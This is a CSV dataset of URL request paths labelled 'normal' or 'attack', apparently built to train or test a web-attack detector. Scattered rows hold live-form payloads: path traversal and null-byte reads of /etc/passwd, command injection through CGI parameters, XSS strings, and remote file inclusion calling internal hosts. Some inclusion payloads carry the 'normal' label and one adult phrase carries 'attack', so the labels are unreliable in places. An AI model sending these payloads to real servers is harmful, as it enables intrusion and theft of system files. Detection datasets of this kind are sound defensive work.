payload,type
/esign-id/,normal
/325869/,normal
/en-resources/,normal
/q14622357,normal
/creates/,normal
/giving-thanks/,normal
/disced/,normal
/itbook/,normal
/040049/,normal
/0117154/,normal
/cameras1/,normal
/javascript/is.tar.gz,normal
/news-292/,normal
/poie022/,normal
/current_range/,normal
/p88207307/,normal
/044651/,normal
/scripts/wwwboard.html,attack
/juniper4_ac3/,normal
/javascript/adm.swf,normal
/f220303e/,normal
/harleygirl/,normal
/1440_anmelden/,normal
/d85863542111/,normal
/subwaybustram/,normal
/javascript/real.rtf,normal
/percocet_ingredient/,normal
/issue7_5/,normal
/061114-052046/,normal
/breitbartbutton/,normal
/1737218/,normal
/components/calendar/com_calendar.php?absolute_path=http://192.168.202.118:8080/2aibfaczmac8??,normal
/30874446/,normal
/doj_letter/,normal
/yourcreditscore/,normal
/section_display/,normal
/q62572563,normal
/news03512/,normal
/appendixa-d/,normal
/042470/,normal
/idbnew/,normal
/sommer-include/,normal
/gpl-faq/,normal
/can-nintendo1312/,normal
/musiikinsoitto_ohjelmat/,normal
/other-telecoms/,normal
/t1utils-1/,normal
/crypt4free/,normal
/dennis-mccauley/,normal
/financial-matters/,normal
/v14960425/,normal
/decision-23jan04/,normal
/javascript/statistics.vb,normal
/pr20001212b/,normal
/scripts/index.php?template=../../../loudblog/custom/config.php\x00,attack
/swissix_zurich/,normal
/182092949/,normal
/000114773/,normal
/119068/,normal
"/i2n4v4rl.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",attack
/msg27525380/,normal
/include.php?_app_relative_path=http://192.168.202.96:8080/txenjrxf3?,normal
/hackerdrw2/,normal
/prnnucptkixl.inc,normal
/ar2006083003009/,normal
|echo$IFSLXLUOD$((68%2B51))$(echo$IFSLXLUOD)LXLUOD,attack
/menu_jobs/,normal
/cgi-bin/webdist.cgi?distloc=;cat /etc/passwd,attack
/morganstein1/,normal
/interesting wow sites/,normal
/rightw/,normal
/0012238/,normal
/appendix1i-iv/,normal
/header_part3/,normal
/javascript/_common.nsf,normal
/javascript/daily.bz2,normal
/jesse_james/,normal
/killsun/,normal
/nav_mitos/,normal
/di2006120800784/,normal
/nessustest464004634.html,normal
/firefox_securit/,normal
/150291/,normal
/178763/,normal
/javascript/module/,normal
/cat-behandlungen/,normal
/index_146/,normal
/level314/,normal
/africa8/,normal
/rlocator/,normal
/xinfoshare/,normal
/your-privacy/,normal
/07promo_190/,normal
/070111/,normal
/text-replace/,normal
/mzk2mjc1/,normal
/sign.png,normal
/2004rightstart/,normal
/als2000/,normal
/200512bydate/,normal
/f2183130/,normal
/people_shatner/,normal
/javascript/gfx.tpl,normal
/427579/,normal
/blood in blood out/,normal
/javascript/layout.test,normal
/departamentos/,normal
/d2000-0872/,normal
/javascript/goaway.xsl,normal
/tk3849-xbtb06353/,normal
/scripts/cxvae_g3rjys.php3,attack
/pinrequest/,normal
/9046985941392727085/,normal
/chinait_80-60/,normal
/judgejudy/,normal
/wkiwar7/,normal
/bextralawsuit/,normal
/134498/,normal
/paciente/,normal
/javascript/input.jpg,normal
/interface/patient_file/reminder/clinical_reminders.php?patient_id=22592,normal
/275501/,normal
/180x100-chile/,normal
/167633/,normal
/javascript/test-cgi.cfm,normal
/custom_programming/,normal
' onmouseover=alert(/Black.Spook/),attack
/kimkomando/,normal
/144117/,normal
/bottomgreenpart3/,normal
/1492088/,normal
/javascript/events.db,normal
/download_engine_v1.4.3/admin/includes/spaw/dialogs/colorpicker.php?spaw_root=http://192.168.202.118:8080/iroy1gvqrrqu?,normal
/sample06/,normal
/oldsite/,normal
/985627805/,normal
/bluesleekframe_computer/,normal
/javascript/bandwidth.htm,normal
/179155/,normal
/gem56-0/,normal
/casehistory/,normal
/chameleonsprings1/,normal
/javascript/balances.tgz,normal
/minimal-app/,normal
/20050209-15/,normal
/notice_en/,normal
/phpmyadmin/googlesearch/googlesearch.php?app[path][lib]=/etc/passwd\x00,attack
/hm-dreamgirls/,normal
/javascript/eu.xml,normal
/127244/,normal
/dvdxcopy platinum 4/,normal
/346463/,normal
/140218/,normal
/prophotoproducts5/,normal
/kxdocker/,normal
/va - club energy vol/,normal
/q18172577,normal
/u701911/,normal
/days of our lives aug 9/,normal
/20050718schwartz/,normal
/cybill-download/,normal
/menu_end/,normal
/mailscan_commendations/,normal
/182118/,normal
/javascript/developers.fcgi,normal
/50903798/,normal
/javascript/meta.tmp,normal
/106176/,normal
/fryzury-krotkie/,normal
/perl/files.pl,normal
/javascript/db.tpl,normal
/lightlab/,normal
/vnews_on/,normal
/1035726/,normal
/117608/,normal
/2 girls with dildo's 1/,attack
/browse-3415021/,normal
/239898/,normal
/d8lvkq600/,normal
/download29/,normal
/rtl8180/,normal
/javascript/left.c,normal
/michalska/,normal
/851111/,normal
/body_bl/,normal
/sellamdproducts/,normal
/pict10/,normal
/qarbon meetingplace icreate v2/,normal
/online-education/,normal
/2170330/,normal
/lightedwindowdecorations/,normal
/30867946/,normal
/sxtoll/,normal
/pet_owners/,normal
/slashnot/,normal
/lasm_v2/,normal
/3650431/,normal
/038483/,normal
/transparante_i/,normal
/229824/,normal
/1046106/,normal
/examples/jsp/jsp2/jspx/admin/admin.php,normal
/javascript/site.txt,normal
/mozilla-calendar/,normal
/t_googledesktop/,normal
/109308/,normal
/xilosoft/,normal
/javascript/mp3s.tgz,normal
/pozycjonowanie_stron/,normal
/article-150076/,normal
/islandsinthenet/,normal
/thumb_rocket/,normal
/varbusiness5star032006/,normal
/opm-ch5/,normal
/javascript/item.o,normal
/i sanningens namn/,normal
/1109294087/,normal
/nowi_uzytkownicy2/,normal
/components/com_guestbook.php?absolute_path=XXpathXX?,attack
/libptp/,normal
/pic-gal/,normal
/javascript/mix.csv,normal
/netwatch-r0/,normal
/securityclassification/,normal
/190679/,normal
/t13984/,normal
/clarion/,normal
/novell-49/,normal
/173563/,normal
/homeschooling_info/,normal
/thinnet-cable/,normal
/scripts/msmmask.exe?mask=/junk334,attack
/cgi-bin/fileseek.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,attack
/-12900/,normal
/gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/zz5thkvtmlgl?&cmd=cat/etc/passwd,attack
/588418/,normal
/ae92sr5/,normal
/javascript/bandwidth.old,normal
/scripts/acp/index.php,attack
/service_tel/,normal
/javascript/_vti_bin.err,normal
/11peterson/,normal
/serviceloginauth/,normal
